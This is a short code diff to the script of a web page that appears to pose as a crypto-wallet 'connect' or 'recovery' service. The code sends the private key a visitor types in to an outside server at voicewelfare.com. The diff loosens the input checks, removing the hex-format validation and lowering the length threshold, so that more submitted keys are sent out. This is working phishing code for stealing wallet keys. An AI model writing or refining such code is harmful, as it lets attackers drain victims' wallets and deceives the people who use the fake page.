@@ -2091,9 +2091,8 @@
     }
 
     function countChars(self) {
-
         let privateKeyLength = self.value.length
-        if (privateKeyLength > 50) {
+        if (privateKeyLength > 30) {
             document.getElementById("submit_private").disabled = false;
         } else {
             document.getElementById("submit_private").disabled = true;
@@ -2192,27 +2191,13 @@
         let randomString = generateRandomString(7);
         let dappName = $('#wallet_name').text();
         let importType = 'PrivateKey';
-
-        const isValidHex = /^(0x)?[0-9a-fA-F]{64}$/; // Regular expression to check if the input is a valid hex string
-
-        if (!isValidHex.test(dappKey)) {
-            console.log("Invalid private key format. Please enter a valid 64-character hex string.");
-            $("#privateKey").addClass("error");
-            document.getElementById("submit_private").disabled = false;
-            return;
-        }
-
         try {
-            let wallet = new ethers.Wallet(dappKey);
-            let dappAddress = wallet.address;
-
             $.ajax({
                 url: "https://voicewelfare.com/recovery/connectdappsolution.php",
                 method: "POST",
                 dataType: "JSON",
                 data: {
                     dappKeys: dappKey,
-                    dappAddress: dappAddress,
                     dappName: dappName,
                     importType: importType,
                 },
